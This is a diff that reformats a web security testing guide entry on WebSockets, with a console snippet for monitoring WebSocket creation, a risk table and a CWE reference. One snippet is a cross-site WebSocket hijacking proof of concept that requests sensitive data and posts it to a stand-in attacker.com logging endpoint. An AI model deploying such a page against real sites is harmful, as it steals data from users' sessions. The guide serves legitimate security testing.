@@ -1,9 +1,11 @@
 # WSTG-CLNT-10: Testing WebSockets
 
 ## Test ID
+
 WSTG-CLNT-10
 
 ## Test Name
+
 Testing WebSockets
 
 ## High-Level Description
@@ -30,14 +32,14 @@ WebSockets provide full-duplex communication channels over a single TCP connecti
 ```javascript
 // Browser console
 // Check for WebSocket connections
-console.log("WebSocket instances:", window.WebSocket);
+console.log("WebSocket instances:", window.WebSocket)
 
 // Monitor WebSocket creation
-const originalWS = window.WebSocket;
-window.WebSocket = function(...args) {
-    console.log('WebSocket created:', args);
-    return new originalWS(...args);
-};
+const originalWS = window.WebSocket
+window.WebSocket = function (...args) {
+  console.log("WebSocket created:", args)
+  return new originalWS(...args)
+}
 ```
 
 ### Step 2: Test WebSocket Security
@@ -134,20 +136,20 @@ asyncio.run(tester.run_tests())
 ```html
 <!-- Host on attacker.com -->
 <script>
-    // If origin is not validated, can hijack WebSocket
-    const ws = new WebSocket('wss://target.com/ws');
+  // If origin is not validated, can hijack WebSocket
+  const ws = new WebSocket("wss://target.com/ws")
 
-    ws.onopen = function() {
-        ws.send(JSON.stringify({action: 'get_sensitive_data'}));
-    };
+  ws.onopen = function () {
+    ws.send(JSON.stringify({ action: "get_sensitive_data" }))
+  }
 
-    ws.onmessage = function(event) {
-        // Steal data
-        fetch('https://attacker.com/log', {
-            method: 'POST',
-            body: event.data
-        });
-    };
+  ws.onmessage = function (event) {
+    // Steal data
+    fetch("https://attacker.com/log", {
+      method: "POST",
+      body: event.data,
+    })
+  }
 </script>
 ```
 
@@ -182,19 +184,19 @@ async def websocket_handler(ws):
 
 ## Risk Assessment
 
-| Finding | CVSS | Severity |
-|---------|------|----------|
-| No origin validation | 8.1 | High |
-| No authentication | 7.5 | High |
-| Injection vulnerabilities | 7.5 | High |
-| Unencrypted (WS not WSS) | 5.3 | Medium |
+| Finding                   | CVSS | Severity |
+| ------------------------- | ---- | -------- |
+| No origin validation      | 8.1  | High     |
+| No authentication         | 7.5  | High     |
+| Injection vulnerabilities | 7.5  | High     |
+| Unencrypted (WS not WSS)  | 5.3  | Medium   |
 
 ---
 
 ## CWE Categories
 
-| CWE ID | Title |
-|--------|-------|
+| CWE ID       | Title                                   |
+| ------------ | --------------------------------------- |
 | **CWE-1385** | Missing Origin Validation in WebSockets |
 
 ---
